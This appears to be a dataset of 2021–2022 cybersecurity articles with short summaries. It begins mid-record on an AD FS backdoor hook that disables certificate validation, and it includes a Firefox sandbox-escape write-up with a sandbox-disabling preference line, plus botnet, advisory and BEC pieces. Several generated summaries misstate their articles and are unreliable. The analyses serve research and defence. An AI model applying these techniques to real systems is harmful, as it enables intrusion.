propertyInfo2 , and propertyInfo3 are initialized with property objects retrieved from ‘properties’ field/array of RuntimeHelper : propertyInfo : CertificateValidation property from type Microsoft.IdentityServer.WebHost.Proxy.ProxyEndpoint of Microsoft.IdentityServer.WebHost.dll propertyInfo2 : Path property from type Microsoft.IdentityServer.WebHost.Proxy.ProxyEndpoint of Microsoft.IdentityServer.WebHost.dll propertyInfo3: Endpoints property from type Microsoft.IdentityServer.WebHost.Proxy.ProxyEndpointConfiguration of Microsoft.IdentityServer.WebHost.dll Next, the hook method retrieves the value of the Endpoint property of the value object that the legitimate EndpointConfiguration() method was called with. The Endpoint property holds a collection of ProxyEndpoint objects. The hook method enumerates the ProxyEndpoint objects and for each object, it checks if the value of the CertificateValidation enum is set to ‘1’ which signifies ‘ SSL ’. If the CertificateValidation enum for a ProxyEndpoint object is set to ‘1’/’SSL’, on line 165, the hook method overwrites the value of the CertificateValidation enum with ‘0’ which signifies ‘None’. To ensure the change is reflected, the hook method then overwrites the Endpoint property of the value object with the updated Endpoint property containing the overwritten CertificateValidation enum values (that is, ‘SSL’ overwritten with ‘None’). Behaving as a true hook method, on line 179, the method calls the legitimate EndpointConfiguration() method but with the modified ‘value’ object. Hence, when the legitimate EndpointConfiguration() method is invoked during the normal operation of AD FS, this hook method intercepts the call and, before passing the object to the legitimate EndpointConfiguration() method was invoked with, it overwrites the CertificateValidation value of each ProxyEndpoint object and only then it calls the legitimate EndpointConfiguration() method but now with modified CertificateValidation value(s), changed from ‘SSL’ to ‘None’. The purpose of overwriting CertificationValidation value to ‘None’ (wherever it’s ‘SSL’) is to allow WAP to pass the request with the specific malicious certificate to AD FS for further authentication processing. According to Microsoft.IdentityServer.ProxyService/TLSClientReqeustHandler , WAP stops sending the current request from client to AD FS if CertificateValidation is ‘1’ (‘SSL’) and the client certificate has an error during validation. References “I am AD FS and so can you: Attacking Active Directory Federated Services” , Austin Baker and Douglas Bienstock, Troopers 2019 Understanding Key Active Directory Federation Services Concepts , Microsoft documentation"
cc069b88-6ec0-533d-862e-6e79e97f13e0,11-August-2022,New Disclosure Timelines for Bugs Resulting from Incomplete Patches,ZDI will adopt a tiered approach for bug reports that result from faulty or incomplete patches. The organization announced new disclosure timelines at the Black Hat USA conference. The ZDI will use a 30-day timeframe for most vulnerabilities and a 60-day timeline for Critical-rated bugs.,"Today at the Black Hat USA conference , we announced some new disclosure timelines. Our standard 120-day disclosure timeline for most vulnerabilities remains, but for bug reports that result from faulty or incomplete patches, we will use a shorter timeline. Moving forward, the ZDI will adopt a tiered approach based on the severity of the bug and the efficacy of the original fix. The first tier will be a 30-day timeframe for most Critical-rated cases where exploitation is detected or expected. The second level will be a 60-day interval for Critical- and High-severity bugs where the patch offers some protections. Finally, there will be a 90-day period for other severities where no imminent exploitation is expected. As with our normal timelines, extensions will be limited and granted on a case-by-case basis. Since 2005, the ZDI has disclosed more than 10,000 vulnerabilities to countless vendors. These bug reports and subsequent patches allow us to speak from vast experience when it comes to the topic of bug disclosure. Over the last few years, we’ve noticed a disturbing trend – a decrease in patch quality and a reduction in communications surrounding the patch. This has resulted in enterprises losing their ability to accurately estimate the risk to their systems. It’s also costing them money and resources as bad patches get re-released and thus re-applied. Adjusting our disclosure timelines is one of the few areas that we as a disclosure wholesaler can control, and it’s something we have used in the past with positive results. For example, our disclosure timeline used to be 180 days. However, based on data we tracked through vulnerability disclosure and patch release, we were able to lower that to 120 days, which helped reduce the vendor’s overall time-to-fix. Moving forward, we will be tracking failed patches more closely and will make future policy adjustments based on the data we collect. Another thing we announced today is the creation of a new Twitter handle: @thezdibugs . This feed will only tweet out published advisories that are either a high CVSS, 0-day, or resulting from Pwn2Own. If you’re interested in those types of bug reports, we ask that you give it a follow. We’re also now on Instagram , and you can follow us there if you prefer that platform over Twitter. Looking at our published and upcoming bug reports, we are on track for our busiest year ever – for the third year in a row. That also means we’ll have plenty of data to look at as we track incomplete or otherwise faulty patches, and we’ll use this data to adjust these timelines as needed based on what we are seeing across the industry. Other groups may have different timelines, but this is our starting point. With an estimated 1,700 disclosures this year alone, we should be able to gather plenty of metrics. Hopefully, we will see improvements as time goes on. Until then, stay tuned to this blog for updates, subscribe to our YouTube channel, and follow us on Twitter for the latest news and research from the ZDI."
5399287c-ccec-595f-8d4c-3310546d21ef,18-October-2022,The benefits of taking an intent-based approach to detecting Business Email Compromise,Business email compromise (BEC) is one of the most financially damaging online crimes. Cisco Talos is using an intent-based model to identify and block BEC messages. BEC has resulted in a 43 billion dollars loss since 2013.,"By Abhishek Singh. BEC is a multi-stage attack. Adversaries first identify targets, then they establish rapport with the victim before exploiting them for whatever their end goal is. In the case of BEC, a threat actor can impersonate any employee in the organization to trick targets. A policy that checks for authorized email addresses of the sender can prevent BEC attacks. However, scaling the approach for every employee in a large organization is a challenge. Building an executive profile based on email analysis using a machine learning model and scanning emails against that profile will detect BEC. Data collection for building and training machine learning algorithms can take time, though, opening a window of opportunity for threat actors to exploit. Detection of exploitation techniques such as lookalike domains and any differences in the email addresses in the ""From"" and ""Reply-to"" fields can also detect BEC messages. However, the final verdict cannot account for the threat actor’s intent. The intent-based approach detects BEC and then classifies it into the type of scam. It catches BEC messages, irrespective of whether a threat actor is impersonating a C-level executive or any employee in an organization. Classification based on the type of scam can help identify which segment of an organization was targeted and which employees were being impersonated by the threat actor. The additional information will further assist in better designing preventive features to stop BEC. Business email compromise (BEC) is one of the most financially damaging online crimes. As per the internet crime 221 report, the total loss in 2021 due to BEC is around 2.4 billion dollars. Since 2013, BEC has resulted in a 43 billion dollars loss. The report defines BEC as a scam targeting businesses (not individuals) working with foreign suppliers and companies regularly performing wire transfer payments. Fraudsters carry out these sophisticated scams to conduct the unauthorized transfer of funds. This introduces the challenge of how to detect and block these campaigns as they continue to compromise organizations successfully. There are a variety of approaches to identifying BEC email messages, such as using policy to allow emails from authorized email addresses, detecting exploitation techniques used by threat actors, building profiles by analysis of emails, and validating against the profile to detect BEC. These approaches have a variety of limitations or shortcomings. Cisco Talos is taking a different approach and using an intent-based model to identify and block BEC messages. Before we get too deep into the intent-based model, take a deeper look at the commonly used approaches to block BEC from the simplistic through machine learning (ML) approaches. Policy-based detection The first place to start is with policy-based detection as it is one of the most common and simplistic approaches to blocking BEC campaigns. Let’s start by looking at an example of a BEC email. Here the actor is attempting to impersonate the CEO of an organization, but if we notice the email itself is associated with a Gmail address, obviously not the corporate domain. Threat actors commonly use free email addresses to send BEC emails. In a policy-based approach, the names of executives and the email address from which they send emails are kept in a database. For every incoming email, a policy rule is implemented that identifies messages that contain the names of executives in the From field and which originate from outside of the tenant. If the email is not from the email address specified in the database for the executive, an alert for BEC is raised. The limitation of this type of detection is that not all BEC campaigns purport to be originating from the CFO/CEO or other senior executives. The example below shows a payroll scam where threat actors were impersonating marketing managers. If the legitimate email addresses of other employees in an organization are not in the database, BEC email messages impersonating non-C-Level executives will get bypassed. Keeping the email address of every employee and vendor for a large corporation will be a challenge. The policy-based solution will stop the BEC exploitation; however, the verdict of the approach will lack the display of intent of the threat actor. Detecting exploitation techniques BEC emails can use exploitation techniques such as look-alike domains in the sender's email address, and the difference in the email address in the ""From,” ""Reply-to"" fields. Some of the ways by which a look-alike domain can be constructed are brand name embedding with ('-'), brand name homograph, miss-spelled brand name, and brand name registered with an uncommon generic top-level domain. The screenshot below shows the initial lure BEC email where the email address in the “From:” field is a spoofed corporate email address, and “Reply-To:” is sent to Gmail. Any reply to the BEC email will be sent to the threat actor’s Gmail address specified in the “Reply-To” field. These anomalies due to exploitation techniques in the sender’s email address can be aggregated with other behavior to detect BEC exploitation. Even though the approach to detect exploitation technique will detect BEC email messages, the approach has limitations. BEC is a multi-stage attack. The first stage is to identify the target, the second stage is to establish rapport with the victim, and the third is the exploitation stage which involves instructing the victim to send money, gift card, or sensitive information. The final verdict of the algorithm will lack the intent of the threat actor. For example, in the verdict, it will not be clear whether the scam that got stopped was a payroll scam or an initial lure scam. Understanding the intent will aid in better understanding which segment inside the organization was targeted and at what stage the exploitation got stopped. The information can then be used as a feedback loop to design preventive features better. Building a profile using ML-based model A machine learning algorithm can be used to build a profile of C-level Executives by analyzing emails. Some of the feature sets which can be used to create profiles are writing style, activity base features such as date, time, geo-location- location from where a person is accessing emails, relations graph which will capture with whom the person interacts, etc. Every incoming email is scanned against the profile. In case of any deviation from the profile, raise an alert for BEC. The method will detect BEC, but it has limitations. Training of the Machine Learning model will require data from real traffic. Data collection, model building, and training will take time, opening a window of opportunity for threat actors to exploit. The final verdict of the algorithm will still lack the intent of the threat actor. Threat actors can impersonate anyone in the organization for BEC scams such as payroll scams. Building the profile of everyone in a large organization will be challenging. Intent-based approach A policy-based approach to detect BEC checks for authorized email addresses; if the sender’s email address is not in the authorized list, it is dropped. The approach will require keeping the email addresses of every employee and vendor, which will be a challenge for a large size corporation. Building an executive profile based upon analysis of emails using a Machine Learning algorithm detecting exploitation techniques used by threat actors is the other approach used by threat actors. Both these approaches will lack the display of intent of the threat actor in the final verdict, and building the profile of every employee based upon analysis of emails in an organization will not be a scalable model. To overcome the limitations of the above approaches, we designed an intent-based approach to detect BEC. The approach breaks down detecting BEC into two distinct problems, a binary class problem, which classifies emails into a BEC message, and a multi-class problem, which classifies BEC into the type of scam. So, the Intent-based approach not only detects BEC but also labels it into the kind of BEC scam, which can be Payroll, Money Transfer, Initial Lure, Gift Card Scams, Invoice Scams, Acquisitions Scams, W2 Scams, aging reports, etc. The approach involves the extraction of text from an email, converting sentences to numeric vectors by encoding the meaning of words in the sentences, using NNLM or BERT encodings, and then performing detection and classification using deep neural networks. The output of the model is a probability score. The high confidence score is used to give the verdict; the low confidence score is combined with other analytic detections to deliver the judgment of the BEC. Intent-based approach to detect BEC provides an inherent advantage. The method will detect BEC exploitation irrespective if the threat actor is impersonating a C-Level executive or any other employee in an organization. Classification of BEC into the type of scam will aid in identifying which segment of the company is targeted. Detecting BEC at the initial lure is always much better than detecting fraudulent banking details sent by threat actors. It will also give an insight into the stage at which an exploitation attempt is being detected, which will aid in designing better preventive features."
0d3d06a0-cbf8-524a-afbb-aff1dac1eede,28-September-2022,Researchers Warn of New Go-based Malware Targeting Windows and Linux Systems,"A new Go-based malware called Chaos has been targeting Windows, Linux, and other platforms. The malware can launch DDoS attacks and exploit known security flaws. Chaos is targeting a wide range of devices, including small office/home office routers and enterprise servers.","A new, multi-functional Go-based malware dubbed Chaos has been rapidly growing in volume in recent months to ensnare a wide range of Windows, Linux, small office/home office (SOHO) routers, and enterprise servers into its botnet. ""Chaos functionality includes the ability to enumerate the host environment, run remote shell commands, load additional modules, automatically propagate through stealing and brute-forcing SSH private keys, as well as launch DDoS attacks,"" researchers from Lumen's Black Lotus Labs said in a write-up shared with The Hacker News. A majority of the bots are located in Europe, specifically Italy, with other infections reported in China and the U.S., collectively representing ""hundreds of unique IP addresses"" over a one-month time period from mid-June through mid-July 2022. Written in Chinese and leveraging China-based infrastructure for command-and-control, the botnet joins a long list of malware that are designed to establish persistence for extended periods and likely abuse the foothold for nefarious purposes, such as DDoS attacks and cryptocurrency mining. If anything, the development also points to a dramatic uptick in threat actors shifting to programming languages like Go to evade detection and render reverse engineering difficult, not to mention targeting several platforms at once. Chaos (not to be confused with the ransomware builder of the same name) lives up to its name by exploiting known security vulnerabilities to gain initial access, subsequently abusing it to conduct reconnaissance and initiate lateral movement across the compromised network. What's more, the malware has versatility that similar malware does not, enabling it to operate across a wide range of instruction set architectures from ARM, Intel (i386), MIPS, and PowerPC, effectively allowing the threat actor to broaden the scope of its targets and swiftly accrue in volume. On top of that, Chaos further has the ability to execute as many as 70 different commands sent from the C2 server, one of which is an instruction to trigger the exploitation of publicly-disclosed flaws ( CVE-2017-17215 and CVE-2022-30525 ) defined in a file. An analysis of around 100 samples discovered in the wild dates the earliest evidence of the botnet activity to April 2022. The malware has since been observed targeting not only enterprise servers and large organizations but also devices that are not regularly monitored, such as SOHO routers and FreeBSD OS. Chaos is also believed to be an evolution of another Go-based DDoS malware named Kaiji that has previously targeted misconfigured Docker instances . The correlations, per Black Lotus Labs, stem from overlapping code and functions, counting that of a reverse shell module that makes it possible to run arbitrary commands on an infected device. A GitLab server located in Europe was one among the victims of the Chaos botnet in the first weeks of September, the company said, adding it identified a string of DDoS attacks aimed at entities spanning gaming, financial services, and technology, media and entertainment, and hosting providers. Also targeted was a crypto mining exchange. The findings come exactly three months after the cybersecurity company exposed a new remote access trojan dubbed ZuoRAT that has been singling out SOHO routers as part of a sophisticated campaign directed against North American and European networks. ""We are seeing a complex malware that has quadrupled in size in just two months, and it is well-positioned to continue accelerating,"" said Mark Dehus, director of threat intelligence for Lumen Black Lotus Labs. ""Chaos poses a threat to a variety of consumer and enterprise devices and hosts."""
dd1e7a73-8568-5136-bf77-b208b265eb6b,28-September-2022,Protecting teens from sextortion: What parents should know,"Recent years have seen an alarming rise in sextortion cases, including those targeting teens. FBI recorded over 16,000 complaints in the first seven months of 2021 alone. Online predators increasingly trick or coerce youth into sharing explicit videos and photos of themselves.","Online predators increasingly trick or coerce youth into sharing explicit videos and photos of themselves before threatening to post the content online The digital world has provided countless opportunities for youngsters that their parents never experienced. It helped kids stay in touch with each other during the dark days of pandemic-era lockdowns. And now that the world is opening up again, the allure of the digital world remains undimmed. But the online world also exposes children to dangers that their parents never encountered when they were young. For example, recent years have seen an alarming rise in sextortion cases, including those targeting teens . In 2021, the FBI claimed to have recorded over 16,000 complaints in the first seven months of the year alone. Many more victims may be too ashamed to come forward. It’s time parents and caregivers wised up to the risks facing their kids online, and learned some best practice tips for mitigating them. As the name suggests, sextortion is a kind of blackmail where a threat actor tricks or coerces a victim into sharing sexually explicit images or videos of themselves and then threatens to release the material unless the victim either pays them or agrees to send more such photos or videos. This crime is not to be confused with sextortion scams , where threat actors send emails claiming to have installed malware on the victim’s computer that allegedly enabled them to record the individual watching pornography. They include personal details such as an old email password obtained from a historic data breach in order to make the threat – almost always an idle one – seem more realistic. The sextortion scam email phenomenon arose from increased public awareness of sextortion itself, with cryptocurrencies allowing an easy and somewhat anonymous payment method. In recent months, the FBI has issued multiple warnings of an increase in sextortion cases where victims have been befriended online by individuals masking their true identity before being tricked into sending explicit images or videos of themselves to the crooks. The victims then faced demands for more such material (or more money) or else the content would be released to the victim’s friends and family. #StopSextortion Say NO to: 🚫Sending compromising photos 🚫Moving conversations to other platforms 🚫Online threats or blackmail attempts Say YES to: ✅Talking with your kids/friends about #sextortion ✅Reporting suspicious behavior https://t.co/OkfB24fcMi Hear from SSA Ferron: pic.twitter.com/gzFDfhY4kr — FBI Baltimore (@FBIBaltimore) August 30, 2022 Worryingly, children and young adults are increasingly the target for sextortion attacks – they are more credulous and therefore easier for attackers to trick. And in many cases, the latter want specifically to obtain compromising images of youngsters for their own gratification. It’s a threat that can target both sexes. While there are many examples of prolific extortionists targeting girls, the FBI also warned recently of a steep increase in sextortion incidents targeting teenage boys . It goes without saying that the prospect of having nude images or videos circulated to friends and family can cause severe emotional and mental trauma for the victims. Children caught up in attacks are often too ashamed or afraid to seek help from friends, parents or teachers. They might try to accede to the extorter’s request, only to dig themselves a deeper hole as the attacker demands more photos or money. Unfortunately, these incidents can in some cases end tragically: Such incidents will horrify most parents. But as tempting as it is to try and restrict internet usage or access to specific sites, creating an atmosphere at home of honesty and mutual trust will be more effective in the long run. RELATED READING: What’s your attitude to parental controls? Parents and caregivers need to first understand the dangers themselves, and then share their insight in a non-judgemental way with their kids. Two-way communication is essential. Youngsters need to feel like they can come to their parents for help if they get embroiled in a sextortion case. If that’s the case, here’s a short list of best practice steps to work through with your child: The good news is that if the extorter has tried to share the content online, most reputable social media sites will have policies to take it down. And police action is having an impact. Just weeks ago, Interpol scored a win when it dismantled a sextortion ring that had made an estimated US$43,000 out of its victims in Asia. Yet prevention is always the best course of action here. While most sextortion threats today involve social engineering rather than information stealing malware, it pays to take steps to mitigate the threat from both. To help protect your child, chat to them about the danger and about the simple steps they can take to keep clear of it. They include basics like: At the same time, it’s never a bad time to consider reminding them of the importance of using strong and unique passwords , using reputable security software, and avoiding to click on links or download attachments in unsolicited messages. To learn more about more dangers faced by children online as well as about how technology can help, head over to Safer Kids Online . Why not also watch ‘ Hey PUG ‘, ESET’s new animated series teaching kids to recognize online threats?"
c53556da-61a2-5adb-b5b5-976f3e25f19a,03-June-2022,UPDATE: CVE-2022-26134 – Confluence Zero-Day Vulnerability,Atlassian has disclosed a critical vulnerability impacting the Confluence collaboration tool. The vulnerability impacts all supported versions of Confluence Server and Data Center. Vulnerability is CVE-2022-26134; active exploitation of the vulnerability has been confirmed.,"June 3 rd Update: Atlassian has released security patches to address this vulnerability. On June 2 nd , 2022, Atlassian disclosed a critical vulnerability impacting the Confluence collaboration tool, tracked as CVE-2022-26134 ; active exploitation of the vulnerability has been confirmed. CVE-2022-26134 is an unauthenticated Remote Code Execution (RCE) vulnerability that impacts all supported versions of Confluence Server and Data Center. Exploitation of this vulnerability would allow an unauthenticated and remote actor to execute code on vulnerable devices, potentially leading to the deployment of malware or the exfiltration of sensitive data. Organizations are strongly recommended to apply the relevant security patches released by Atlassian on June 3 rd , as exploitation is ongoing. Technical details relating to CVE-2022-26134 are currently limited. While not yet confirmed, it is likely that all versions of Confluence Server and Data Center are impacted, including out of support versions. The vulnerability does not impact Confluence Cloud. CVE-2022-26134 was initially discovered by Volexity . According to the company, attacks exploiting the vulnerability were first identified on the Memorial Day weekend (May 28 th -30 th ). Attacks observed by Volexity resulted in the deployment of the open-source webshell BEHINDER, a file upload webshell, and the China Chopper webshell. According to Volexity, multiple threat actor groups are believed to be exploiting the vulnerability in real-world attacks. [1] https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html [2] https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html [3] https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/"
5ab7c780-9bdc-5136-a71a-c1fbb7e175f3,23-August-2022,But You Told Me You Were Safe: Attacking the Mozilla Firefox Sandbox (Part 2),"Pwn2Own contestant Manfred Paul was able to compromise the Mozilla Firefox renderer process. He exploited a prototype pollution vulnerability in some built-in JavaScript code that executes in the sandbox. In this post, we look at a second prototype vulnerability in the privileged parent process. This vulnerability allows attacker-controlled JavaScript to be executed in the chrome process.","In the first part of this series , we reviewed how Pwn2Own contestant Manfred Paul was able to compromise the Mozilla Firefox renderer process via a prototype pollution vulnerability in the await implementation. In modern browser architecture design, compromising the renderer gets us just half the way there, since the sandbox prevents further damage. In this blog post, we discuss a second prototype pollution vulnerability that allowed the execution of attacker-controlled JavaScript in the privileged parent process, escaping the sandbox. This vulnerability is known as CVE-2022-1529 and is tracked as ZDI-22-798 on the Zero Day Initiative advisory page. Mozilla fixed this vulnerability along with the first one in Firefox 100.0.2 via Mozilla Foundation Security Advisory 2022-19 . Root Cause As described in the previous post, the exploit compromised the renderer by leveraging a prototype pollution vulnerability in some built-in JavaScript code that executes in the renderer process. For the sandbox escape part of the exploit, the researcher used a second prototype pollution vulnerability. This second vulnerability exists in built-in JavaScript code that runs in the fully privileged parent process, also known as the chrome process (not to be confused with Google’s Chrome browser). How can the sandboxed renderer process affect JavaScript running in the chrome process? The answer is that the renderer can communicate with the chrome process via various interfaces. In fact, some of these interfaces can be reached directly from JavaScript when running in a “privileged” JavaScript context (not to be confused with any OS-level concept of privilege). As we will see, achieving “privileged” JavaScript execution will be the exploit’s first step. After achieving privileged JavaScript execution, the exploit can reach out to various endpoints for communication with the chrome process. One of the endpoints is called NotificationDB. It is implemented almost entirely in JavaScript. It processes various messages, which it receives via the content process message manager . In the case of a “Notification:Save” message, a “save” task is queued: After the “save” task is put on the queue, it is handled in the chrome process, in the “taskSave” function: At [1], both origin and notification.id are taken directly from the message data sent by the renderer, without any validation. This means we can set either of these to any serializable JavaScript value. More specifically, we can set them to any values supported by the structured clone algorithm , since this is the algorithm used to marshal data from the renderer to the chrome process. If we set origin to the string ""__proto__"" , then this.notifications[origin] will not access a normal data property. Instead, it will access the object’s prototype. This prototype is Object.prototype , since this.notifications is a plain Object . This gives us a prototype pollution primitive. It allows us to write any serializable JavaScript value to any property of Object.prototype with only one restriction: the value we write must have an id property that matches the property name we are writing to. Using this prototype pollution, we can corrupt the global JavaScript state in the chrome process. This affects all JavaScript that runs in the chrome process, far beyond NotificationDB.jsm itself. Since JavaScript execution contexts are largely shared, all chrome-level JavaScript modules are now exposed to unexpected properties in Object.prototype . The exploit will use this corruption to gain chrome-level XSS during tab restoration, leading to native code execution outside the sandbox. Now that we have a complete picture of what we want to do, let’s begin. Achieving Privileged JavaScript Execution As mentioned above, before we can invoke NotificationDB , we need to access a privileged JavaScript context. In particular, what we need is access to an object called components . This is a different object than a much more limited object confusingly also named Components , which is intended to be exposed to untrusted script. To gain access to components , the attacker script performs the following steps. Note that all this is made possible because the attacker script has already gained full native code execution within the renderer sandbox, as detailed in part one of this series: 1 -- Mark the current JavaScript compartment as system by setting the corresponding flag in memory. 2 -- Patch CanCreateWrapper to always return NS_OK . This prevents further security checks on the calling context. 3 -- Call the GetComponents method to add the components object to the scope. Triggering the Prototype Pollution Primitive Once we have obtained the components object, we are nearly ready to trigger the prototype pollution. One obstacle remains: due to the details of Firefox's “cross-compartment” handling of JavaScript objects, the ContentProcessMessageManager object we want to access is hidden behind an opaque proxy object. This can be circumvented by reading the proxy’s underlying object pointer and using a “fakeObj” to convert it to a JavaScript object. We can now call the vulnerable NotificationDB interface: Remember that a limitation applies to the way that we can overwrite properties of Object.prototype : we can set any property name to any value val , but val.id must equal name . For our purposes, the exact value of val will not matter. Only its string representation is important (more precisely, the result of running the ECMAScript ToString algorithm). The loose type system of JavaScript helps us here. Consider the following array object: This object has its id property set to the arbitrary string ""foo"" , but ToString will represent the object by just the string ""bar"" . Therefore, as long as we only care about the string representation, we can set any property of Object.prototype to any value we desire. Leveraging the Prototype Pollution for Sandbox Escape Consider the following code in browser/components/sessionstore/TabAttributes.jsm , which executes in the chrome process: Note that a for ... in loop will traverse all properties found in the prototype chain, and not only the properties found on the object itself. Therefore, by invoking the code shown above after we have polluted Object.prototype , we can cause tab.setAttribute to be called with arbitrary parameters. This will set an arbitrary HTML (technically XUL ) attribute of a tab. How can we cause this function to run? It turns out that the only time it is called is during the restoration of tabs. There are multiple ways to trigger this functionality: 1 -- Session restoration after restarting the browser. 2 -- Use of the “reopen closed tab” feature (Ctrl+Shift+T). 3 -- Reactivating a tab after “Tab Unloading”, which occurs when Firefox starts to run out of memory. 4 -- Automatically restoring a tab after it has crashed. The first choice is not an option, since restarting the browser would not preserve the polluted prototype. In the real world, waiting for option #2 might work, but it requires user interaction, making it unsuitable for Pwn2Own. It’s also possible to force option #3 by allocating large chunks of memory. However, by default, it takes at least 10 minutes of inactivity before unloading will happen, which exceeds the Pwn2Own time constraint. This leaves just option #4. Fortunately, crashing the renderer process is trivial: we have already achieved memory corruption, and we can simply write to an invalid address to force a segmentation fault. So far, the sandbox escape exploit proceeds as follows: 1 -- Trigger the prototype pollution, adding a property and value to Object.prototype in the chrome process. The name/value pair we add corresponds to the parameters we want to pass to tab.setAttribute . For example, if we add a property named ""a"" with string value ""b"" , then tab.setAttribute will ultimately be invoked with parameters (""a"", ""b"") . 2 -- Open a new background tab. Note that a simple window.open method call without prior user interaction is blocked by the popup blocker. However, the check is entirely renderer-side, and the services.ww.openWindow API obtained from the components object has no such restriction. 3 -- In this background tab, crash the renderer. The chrome process will immediately restore the background tab. The polluted prototype will cause the tab restoration logic to set our chosen attribute on the tab. Next, we must consider: what parameters do we want to pass to tab.setAttribute ? As the browser UI that contains the tab element is written not in HTML but rather the similar XUL markup language, attributes such as “onload” or “onerror” that are commonly used for XSS do not seem to work. Going through a list of XUL event handlers, there are only two that seem to work without any direct user interaction: “onoverflow” and “onunderflow”. These are triggered when the tab’s title text starts to exceed or no longer exceeds the available space. We can trigger the former by setting a style attribute with the value text-indent: 500px . Once we have achieved JavaScript execution within the chrome process, there are many ways to complete the sandbox escape. For example, we could disable all sandboxing in the future by setting a preference: Services.prefs.setIntPref(""security.sandbox.content.level"", 0); Afterward, the exploit could run script in a new tab, which will be created without any sandbox protections. Alternatively, it could run script directly in the chrome process. Either way, the file and process APIs that are available in chrome-level JavaScript can be used to gain native code execution not constrained by any sandbox: Here is a short video demonstrating running the full exploit against Mozilla Firefox 100.0.1 (64-bit): Final Notes Modern browsers process large volumes of data coming from numerous untrusted sources. Modern browser architecture goes a long way towards containing damage in cases where the renderer process is compromised. However, there remain multiple security checks that are performed on the renderer side. We have seen how these checks could be bypassed, ultimately leading to full compromise of the main browser process. In general, it is wise to reduce renderer-side security checks and move them to the main process wherever it is practical. You can find me on Twitter at @hosselot and follow the team on Twitter or Instagram for the latest in exploit techniques and security patches."
813f6993-ec53-5a55-8c32-faa10b5da47a,04-February-2021,"KashmirBlack botnet targets WordPress, Joomla and other popular CMS platforms",KashmirBlack is a botnet that has been in the wild since 2019. KashmirBlack exploits dozens of vulnerabilities in popular content management systems to infect hundreds of thousands of systems. The botnet targets sites hosted on popular CMS systems such as WordPress and Joomla. It is believed to be exploiting the Monero cryptocurrency to mine the currency.,"Introduction If you are a malware researcher, you’ve probably heard of KashmirBlack, a botnet that has been in the wild since 2019. If you are not a malware researcher, you may not have heard of it — and this needs to change (especially if you are invested in cryptocurrency and the mining thereof). This article will detail the KashmirBlack botnet. We will explore what it is, how it works and what you can do to remediate or mitigate it. While this may be a new one to you, you will certainly remember it by the end of this article. What is KashmirBlack? KashmirBlack is a botnet that has been exploiting dozens of vulnerabilities within widely used content management systems (CMS) to compromise hundreds of thousands of systems across 30 countries. Researchers estimate that KashmirBlack infects somewhere around 700 systems per day. Part of the secret sauce to this fast-spreading botnet is that it targets sites hosted on popular CMS systems. The popularity of these CMS entities, such as WordPress, Joomla, Magento and PrestaShop, makes the job of the KashmirBlack operators easier because it means the potential to reach multiple victims within a short amount of time. The proof is in the numbers, as KashmirBlack launches millions of attacks daily — which is another reason for its fast spread capability. KashmirBlack is believed to be the product of a hacker named Exect1337, part of a hacker gang named PhantomGhost, out of Indonesia. This group is known for defacement and is considered to be an active hacker crew engaging in cybercrime. How does KashmirBlack work? KashmirBlack is an interesting botnet: it has some unique characteristics that set it apart from others, with the purpose of either abusing compromised systems’ resources to mine the Monero cryptocurrency and redirecting legitimate website traffic over to spam sites. It has a well-designed infrastructure which makes expanding the botnet easy by adding new exploits and payloads, which will be explored below. Unlike the organization of other botnets, KashmirBlack has a more complex organization where there are 60 servers, known as compromised content management servers, that are controlled by its command-and-control (C2) server. Controlling these 60 servers allows the C2 server to control hundreds of bots simultaneously to send new targets and to expand the size of its botnet through the use of back doors and brute-force attacks. KashmirBlack exploitation normally begins with taking advantage of CVE-2017-9841, or the PHPUnit RCE vulnerability, to infect victims with next-stage malicious payloads. These payloads then communicate with the C2 server for further instruction. The infrastructure of this botnet is modular, consisting of separate components. Instead of relying upon one repository of data to communicate with the C2 server, KashmirBlack relies on two — one repository is dedicated to malicious scripts used in communication with the C2 and the second repository dedicated to hosting exploits and payloads. Another interesting aspect about this botnet is that it uses two categories of bots. The first type of bot, known as a spreading bot, is a compromised victim server that receives commands from the C2 server instructing the spreading bot to infect new-found victims. The other bot type, a pending bot, is a bot whose purpose in the botnet has not yet been defined. It’s sort of like a new recruit without a specific focus but waiting for their first assignment. KashmirBlack has made some changes recently that will make this botnet even more effective. For starters, the fact that KashmirBlack grows so rapidly introduced an issue to its creators — that of scalability. There is no use getting so big without a way to control the monster you have created. In response, a load balancer was added to help with this by returning the address of one of KashmirBlack’s redundant servers. This next change is both the biggest and has been described as the most insidious. KashmirBlack has scrapped the use of the C2 infrastructure altogether and has replaced it with Dropbox. It abuses the cloud-based service’s API to receive instructions for attack, as well as upload attack reports coming from the so-called spreading bots. This move to a cloud web service helps to hide KashmirBlack’s traffic by making it more difficult to trace and helps to secure the operations of the C2 behind with the use of the cloud services in-built security. It is analogous to conducting criminal activity in a rent-a-space business that has the protection of a high fence and security guards. How to remediate and mitigate KashmirBlack The good thing is you can actively remediate and mitigate KashmirBlack. Here are some suggestions that you should use toward this end. If you are infected with KashmirBlack: Kill malicious processes you find Remove malicious files Remove cron jobs that are suspicious or unfamiliar Remove plugins and themes that you do not use or need Suggestions for mitigation if you only suspect KashmirBlack infection: Update core files of the CMS and third-party modules and ensure that they are properly configured Deny unauthorized access to paths such as install.php, eval-stdin.php and wp-config.php, as well as sensitive files Use strict password policies and integrate two factor authentication (2FA) if possible Conclusion KashmirBlack is a botnet that targets sites on popular CMS platforms with the purpose of crypto mining (Monero specifically) and sending spam to potential future victims. It has a unique infrastructure that includes two data repositories and 60 compromised content servers which the C2 uses to wage a fast-growing botnet operation. Those involved with cryptocurrency will do well in keeping the above recommendations for mitigation at hand, but something tells me they already have, given their bleeding-edge approach to things. Sources KashmirBlack Botnet Hijacks Thousands of Sites Running on Popular CMS Platforms , The Hacker News KashmirBlack, a new botnet in the threat landscape that rapidly grows , Security Affairs CrimeOps of the KashmirBlack Botnet – Part II , Imperva Greg is a Veteran IT Professional working in the Healthcare field. He enjoys Information Security, creating Information Defensive Strategy, and writing – both as a Cybersecurity Blogger as well as for fun."
